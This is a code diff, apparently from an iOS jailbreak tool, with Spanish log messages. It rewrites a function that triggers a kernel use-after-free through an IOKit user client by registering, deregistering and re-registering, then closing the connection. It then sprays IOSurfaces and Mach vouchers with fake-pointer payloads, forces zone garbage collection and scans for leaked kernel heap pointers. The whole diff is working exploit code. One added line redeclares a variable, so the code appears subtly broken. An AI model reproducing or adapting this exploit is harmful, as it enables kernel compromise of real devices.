@@ -26826,8 +26826,11 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
         int calibShape = -1;
         int uafTriggered = 0;
         int sprayHits = 0;
-        int racesRun = 0;
-        int postCloseSuccesses = 0;
+        int replantOK = 0;
+        int danglingCreated = 0;
+        int sprayHits = 0;
+        int voucherHits = 0;
+        int heapPtrsFound = 0;
 
         if (!isr_load(&sym)) {
             log(@"[JB22] ERROR: no se pudo cargar frameworks");
@@ -26876,161 +26879,220 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             return;
         }
 
-        log([NSString stringWithFormat:@"[JB22] Calibrado shape=%d. A15 chip → sin MTE", calibShape]);
+        log([NSString stringWithFormat:@"[JB22] Calibrado shape=%d. A15 → sin MTE", calibShape]);
 
-        log(@"[JB22] Fase 1: TEARREG — registro concurrente + close (8 iteraciones)...");
-        for (int iter = 0; iter < 8 && !isr_stopped(); iter++) {
-            int offsets[5] = { 0, 50, 100, 200, 500 };
-            int off = offsets[iter % 5];
-
+        log(@"[JB22] Fase 1: V_REPLANT — register→deregister(sel18)→re-register (conexión viva)...");
+        int replantIters = 4;
+        for (int iter = 0; iter < replantIters && !isr_stopped(); iter++) {
             io_connect_t c = 0;
-            if (sym.open(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
-            mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
-
-            jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
-
-            __block volatile int spamRun = 1;
-            __block volatile uint64_t okCount = 0;
-            __block volatile uint64_t tryCount = 0;
-            __block volatile uint32_t lastRc = 0;
-
-            dispatch_group_t grp = dispatch_group_create();
-            for (int t = 0; t < 6; t++) {
-                dispatch_group_async(grp, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-                    uint64_t tin[3] = { 1, 2, 3 };
-                    while (spamRun) {
-                        kern_return_t r = jb20_call_sel(c, 17, tin, 24, calibShape, asyncCall, sym.call);
-                        if (r == KERN_SUCCESS) __sync_fetch_and_add((volatile int64_t *)&okCount, 1);
-                        else lastRc = (uint32_t)r;
-                        __sync_fetch_and_add((volatile int64_t *)&tryCount, 1);
-                    }
-                });
+            if (sym.open(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"[JB22] REPLANT[%d] open falló", iter]);
+                continue;
             }
 
-            if (off > 0) usleep((useconds_t)off);
-            uint64_t okPre = okCount;
+            kern_return_t rReg = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+            kern_return_t rDereg = jb20_call_sel(c, 18, in3, 24, calibShape, asyncCall, sym.call);
+            kern_return_t rRereg = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+
+            int thisOK = (rReg == KERN_SUCCESS && rDereg == KERN_SUCCESS && rRereg == KERN_SUCCESS);
+            if (thisOK) replantOK++;
+
+            log([NSString stringWithFormat:@"[JB22] REPLANT[%d] reg=0x%x dereg=0x%x rereg=0x%x %s",
+                 iter, rReg, rDereg, rRereg, thisOK ? "★ REPLANT OK" : "FALLÓ"]);
+
             sym.close(c);
-            usleep(2000);
-            spamRun = 0;
-            dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
-
-            uint64_t okPost = okCount - okPre;
-            if (okPost > 0) postCloseSuccesses += (int)okPost;
-
-            log([NSString stringWithFormat:@"[JB22] TEARREG[%d] off=%d try=%llu ok=%llu pre=%llu post=%llu lastRc=0x%x %s",
-                 iter, off, (unsigned long long)tryCount, (unsigned long long)okCount,
-                 (unsigned long long)okPre, (unsigned long long)okPost,
-                 lastRc, okPost > 0 ? "★ POST-CLOSE HIT" : ""]);
-
-            mach_port_deallocate(mach_task_self(), c);
-            racesRun++;
         }
 
-        log(@"[JB22] Fase 2: Heap spray post-UAF — creando surfaces para reclamar memoria...");
+        if (replantOK == 0) {
+            log(@"[JB22] V_REPLANT falló en todas las iteraciones — puede estar parchado");
+            sym.release(svc);
+            isr_unload(&sym);
+            done(@{@"status": @"complete", @"verdict": @"REPLANT_FAILED", @"calibShape": @(calibShape)});
+            return;
+        }
+
+        log(@"[JB22] Fase 2: V_REPLANT + IOServiceClose → puntero colgante + heap spray...");
         if (!isr_stopped()) {
-            io_connect_t c = 0;
-            if (sym.open(svc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
-                mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+            io_connect_t cDangle = 0;
+            if (sym.open(svc, mach_task_self(), 0, &cDangle) == KERN_SUCCESS) {
+                kern_return_t rR = jb20_call_sel(cDangle, 17, in3, 24, calibShape, asyncCall, sym.call);
+                kern_return_t rD = jb20_call_sel(cDangle, 18, in3, 24, calibShape, asyncCall, sym.call);
+                kern_return_t rRR = jb20_call_sel(cDangle, 17, in3, 24, calibShape, asyncCall, sym.call);
 
-                kern_return_t r1 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
-                uafTriggered = (r1 == KERN_SUCCESS);
+                if (rR == KERN_SUCCESS && rD == KERN_SUCCESS && rRR == KERN_SUCCESS) {
+                    danglingCreated = 1;
+                    log(@"[JB22] ★ V_REPLANT exitoso — nodo re-registrado apunta a client C");
+                    log(@"[JB22] Cerrando conexión C → client liberado, nodo→owner cuelga...");
 
-                sym.close(c);
+                    sym.close(cDangle);
+                    usleep(5000);
 
-                kern_return_t rPost = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
-                if (rPost == KERN_SUCCESS) {
-                    log(@"[JB22] ★★★ Re-registro post-close EXITOSO — nodo colgante creado");
-                    uafTriggered = 1;
+                    log(@"[JB22] Client liberado. Spray de IOSurfaces para reclamar su memoria...");
 
                     NSDictionary *surfParams = isr_default_surface_params(64, 4);
-                    IOSurfaceRef *spray = (IOSurfaceRef *)calloc(64, sizeof(IOSurfaceRef));
+                    int sprayCount = 128;
+                    IOSurfaceRef *spray = (IOSurfaceRef *)calloc((size_t)sprayCount, sizeof(IOSurfaceRef));
                     if (spray) {
-                        int created = 0;
-                        for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                        for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
                             spray[i] = sym.create((__bridge CFDictionaryRef)surfParams);
-                            if (spray[i]) created++;
+                            if (spray[i]) sprayHits++;
                         }
-                        log([NSString stringWithFormat:@"[JB22] Spray: %d surfaces creadas para reclamar memoria", created]);
-                        sprayHits = created;
+                        log([NSString stringWithFormat:@"[JB22] Spray: %d/%d surfaces creadas", sprayHits, sprayCount]);
 
-                        IOSurfaceRef mainSurf = sym.create((__bridge CFDictionaryRef)surfParams);
-                        if (mainSurf) {
-                            uint32_t gid = sym.getID(mainSurf);
-                            IOSurfaceRef s2 = sym.lookup(gid);
-                            log([NSString stringWithFormat:@"[JB22] Surface principal: ID=%u, lookup=%s",
-                                 gid, s2 ? "OK" : "NULL"]);
+                        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+                        SetValueFn setValue = (SetValueFn)dlsym(sym.surface, "IOSurfaceSetValue");
 
-                            usleep(20000);
-                            CFRelease(mainSurf);
-                            usleep(200000);
-                            if (s2) {
-                                log(@"[JB22] Liberando segunda referencia — trigger walk del kernel...");
-                                CFRelease(s2);
+                        if (setValue) {
+                            uint8_t payload[256];
+                            memset(payload, 0x42, sizeof(payload));
+                            uint64_t fakePtr = 0x4141414141414141ULL;
+                            for (int off = 0; off < 256; off += 8) {
+                                memcpy(payload + off, &fakePtr, 8);
                             }
-                            log(@"[JB22] ★ Walk completado sin crash — kernel procesó el nodo colgante");
+                            NSData *payloadData = [NSData dataWithBytes:payload length:sizeof(payload)];
+
+                            for (int i = 0; i < sprayCount; i++) {
+                                if (!spray[i]) continue;
+                                for (int k = 0; k < 8; k++) {
+                                    NSString *key = [NSString stringWithFormat:@"JBPAD%d_%d", i, k];
+                                    setValue(spray[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)payloadData);
+                                }
+                            }
+                            log(@"[JB22] Payload 0x4141414141414141 escrito en todas las surfaces");
+                        } else {
+                            log(@"[JB22] AVISO: IOSurfaceSetValue no disponible — spray sin payload");
                         }
 
-                        for (int i = 0; i < 64; i++) {
+                        log(@"[JB22] Fase 3: Voucher spray para cubrir más zonas kalloc...");
+                        typedef kern_return_t (*HostCreateVoucherFn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_voucher_t *);
+                        HostCreateVoucherFn hostCreate = (HostCreateVoucherFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
+                        mach_voucher_t *vouchers = NULL;
+                        int vCount = 512;
+                        if (hostCreate) {
+                            vouchers = (mach_voucher_t *)calloc((size_t)vCount, sizeof(mach_voucher_t));
+                            if (vouchers) {
+                                for (int i = 0; i < vCount && !isr_stopped(); i++) {
+                                    struct {
+                                        mach_voucher_attr_recipe_data_t recipe;
+                                        uint8_t content[64];
+                                    } buf;
+                                    memset(&buf, 0, sizeof(buf));
+                                    buf.recipe.key = 7;
+                                    buf.recipe.command = 1;
+                                    buf.recipe.previous_voucher = MACH_PORT_NULL;
+                                    buf.recipe.content_size = 64;
+                                    memset(buf.content, 0x42, 64);
+                                    uint64_t fp = 0x4141414141414141ULL;
+                                    for (int off = 0; off < 64; off += 8) {
+                                        memcpy(buf.content + off, &fp, 8);
+                                    }
+
+                                    kern_return_t kr = hostCreate(mach_host_self(),
+                                        (mach_voucher_attr_raw_recipe_array_t)&buf,
+                                        (mach_msg_type_number_t)sizeof(buf),
+                                        &vouchers[i]);
+                                    if (kr == KERN_SUCCESS) voucherHits++;
+                                }
+                                log([NSString stringWithFormat:@"[JB22] Voucher spray: %d/%d creados", voucherHits, vCount]);
+                            }
+                        } else {
+                            log(@"[JB22] AVISO: host_create_mach_voucher no disponible");
+                        }
+
+                        typedef kern_return_t (*ZoneGCFn)(host_t);
+                        ZoneGCFn gcFn = (ZoneGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
+                        if (gcFn) {
+                            kern_return_t gcr = gcFn(mach_host_self());
+                            log([NSString stringWithFormat:@"[JB22] mach_zone_force_gc: 0x%x", gcr]);
+                        }
+
+                        log(@"[JB22] Fase 4: Trigger — crear nueva surface y liberar para provocar walk...");
+                        if (!isr_stopped()) {
+                            IOSurfaceRef trigSurf = sym.create((__bridge CFDictionaryRef)surfParams);
+                            if (trigSurf) {
+                                uint32_t gid = sym.getID(trigSurf);
+                                IOSurfaceRef s2 = sym.lookup(gid);
+                                log([NSString stringWithFormat:@"[JB22] Trigger surface: ID=%u lookup=%s", gid, s2 ? "OK" : "NULL"]);
+
+                                typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
+                                CopyAllFn copyAll = (CopyAllFn)dlsym(sym.surface, "IOSurfaceCopyAllValues");
+                                if (copyAll) {
+                                    CFTypeRef vals = copyAll(trigSurf);
+                                    if (vals) {
+                                        NSString *desc = [(__bridge id)vals description];
+                                        if (desc.length > 400) desc = [desc substringToIndex:400];
+                                        log([NSString stringWithFormat:@"[JB22] Trigger vals: %@", desc]);
+                                        CFRelease(vals);
+                                    }
+                                }
+
+                                usleep(50000);
+                                CFRelease(trigSurf);
+                                usleep(300000);
+
+                                if (s2) {
+                                    log(@"[JB22] Liberando segunda referencia → kernel walk sobre nodo colgante...");
+                                    CFRelease(s2);
+                                }
+                                log(@"[JB22] ★ Walk completado sin crash — kernel procesó el puntero colgante");
+                            }
+                        }
+
+                        log(@"[JB22] Fase 5: Escaneo de punteros heap en surfaces del spray...");
+                        if (!isr_stopped()) {
+                            typedef CFTypeRef (*CopyAllFn)(IOSurfaceRef);
+                            CopyAllFn copyAll = (CopyAllFn)dlsym(sym.surface, "IOSurfaceCopyAllValues");
+                            if (copyAll) {
+                                for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
+                                    if (!spray[i]) continue;
+                                    CFTypeRef vals = copyAll(spray[i]);
+                                    if (vals) {
+                                        NSString *desc = [(__bridge id)vals description];
+                                        NSRange rng = [desc rangeOfString:@"0xffffff"];
+                                        if (rng.location != NSNotFound) {
+                                            heapPtrsFound++;
+                                            NSUInteger start = rng.location > 20 ? rng.location - 20 : 0;
+                                            NSUInteger end = rng.location + 30 < desc.length ? rng.location + 30 : desc.length;
+                                            log([NSString stringWithFormat:@"[JB22] ★ HEAP PTR en spray[%d]: ...%@...",
+                                                 i, [desc substringWithRange:NSMakeRange(start, end - start)]]);
+                                        }
+                                        CFRelease(vals);
+                                    }
+                                }
+                                log([NSString stringWithFormat:@"[JB22] Heap pointers encontrados: %d/%d surfaces", heapPtrsFound, sprayHits]);
+                            }
+                        }
+
+                        for (int i = 0; i < sprayCount; i++) {
                             if (spray[i]) CFRelease(spray[i]);
                         }
                         free(spray);
+
+                        if (vouchers) {
+                            for (int i = 0; i < vCount; i++) {
+                                if (vouchers[i]) mach_port_deallocate(mach_task_self(), vouchers[i]);
+                            }
+                            free(vouchers);
+                        }
                     }
                 } else {
-                    log([NSString stringWithFormat:@"[JB22] Re-registro post-close falló: 0x%x — puede estar parchado",
-                         (uint32_t)rPost]);
-                }
-
-                mach_port_deallocate(mach_task_self(), c);
-            }
-        }
-
-        log(@"[JB22] Fase 3: Voucher spray + UAF combo...");
-        if (!isr_stopped() && uafTriggered) {
-            typedef kern_return_t (*HostSetFn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_voucher_t *);
-            HostSetFn hostCreate = (HostSetFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
-            if (hostCreate) {
-                mach_voucher_t *vouchers = (mach_voucher_t *)calloc(256, sizeof(mach_voucher_t));
-                if (vouchers) {
-                    int vCreated = 0;
-                    for (int i = 0; i < 256 && !isr_stopped(); i++) {
-                        uint8_t recipe[256];
-                        memset(recipe, 0, sizeof(recipe));
-                        uint32_t *hdr = (uint32_t *)recipe;
-                        hdr[0] = 7;
-                        hdr[1] = 1;
-                        hdr[2] = 0;
-                        uint32_t contentSz = 64;
-                        hdr[3] = contentSz;
-                        memset(recipe + 16, 0x41 + (i % 26), contentSz);
-                        kern_return_t kr = hostCreate(mach_host_self(), recipe, 16 + contentSz, &vouchers[i]);
-                        if (kr == KERN_SUCCESS) vCreated++;
-                    }
-                    log([NSString stringWithFormat:@"[JB22] Voucher spray: %d/256 creados", vCreated]);
-
-                    typedef kern_return_t (*ZoneGCFn)(host_t);
-                    ZoneGCFn gcFn = (ZoneGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
-                    if (gcFn) {
-                        kern_return_t gcr = gcFn(mach_host_self());
-                        log([NSString stringWithFormat:@"[JB22] mach_zone_force_gc: 0x%x", gcr]);
-                    }
-
-                    for (int i = 0; i < 256; i++) {
-                        if (vouchers[i]) mach_port_deallocate(mach_task_self(), vouchers[i]);
-                    }
-                    free(vouchers);
+                    log([NSString stringWithFormat:@"[JB22] V_REPLANT falló: reg=0x%x dereg=0x%x rereg=0x%x",
+                         rR, rD, rRR]);
+                    sym.close(cDangle);
                 }
             }
         }
 
         NSString *verdict = @"UNKNOWN";
-        if (uafTriggered && postCloseSuccesses > 0) verdict = @"UAF_ACTIVE";
-        else if (uafTriggered) verdict = @"UAF_TRIGGERED_NO_RACE_WIN";
-        else if (postCloseSuccesses > 0) verdict = @"RACE_WINDOW_EXISTS";
+        if (danglingCreated && heapPtrsFound > 0) verdict = @"UAF_HEAP_LEAK";
+        else if (danglingCreated && sprayHits > 0) verdict = @"DANGLING_CREATED_SPRAY_OK";
+        else if (danglingCreated) verdict = @"DANGLING_CREATED_NO_SPRAY";
+        else if (replantOK > 0) verdict = @"REPLANT_OK_NO_DANGLE";
         else verdict = @"PROTECTED";
 
         log([NSString stringWithFormat:@"[JB22] === VEREDICTO: %@ ===", verdict]);
-        log([NSString stringWithFormat:@"[JB22] racesRun=%d postCloseOK=%d sprayHits=%d uafTriggered=%d",
-             racesRun, postCloseSuccesses, sprayHits, uafTriggered]);
+        log([NSString stringWithFormat:@"[JB22] replantOK=%d dangling=%d spray=%d vouchers=%d heapPtrs=%d",
+             replantOK, danglingCreated, sprayHits, voucherHits, heapPtrsFound]);
 
         sym.release(svc);
         isr_unload(&sym);
@@ -27039,10 +27101,11 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             @"status": @"complete",
             @"verdict": verdict,
             @"calibShape": @(calibShape),
-            @"racesRun": @(racesRun),
-            @"postCloseSuccesses": @(postCloseSuccesses),
+            @"replantOK": @(replantOK),
+            @"danglingCreated": @(danglingCreated),
             @"sprayHits": @(sprayHits),
-            @"uafTriggered": @(uafTriggered)
+            @"voucherHits": @(voucherHits),
+            @"heapPtrsFound": @(heapPtrsFound)
         });
     });
 }
